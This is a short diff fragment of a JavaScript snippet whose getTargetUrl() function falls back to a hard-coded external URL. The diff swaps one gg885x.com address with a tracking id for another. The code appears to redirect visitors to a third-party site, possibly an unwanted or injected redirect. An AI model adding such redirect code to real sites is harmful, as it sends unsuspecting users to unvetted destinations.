@@ -1,6 +1,6 @@
 (function () {
   function getTargetUrl() {
-    return window.REDIRECT_URL || "https://gg8850.com/?id=248422193";
+    return window.REDIRECT_URL || "https://www.gg8858.com/?id=789440420";
   }
 
   function goTarget() {
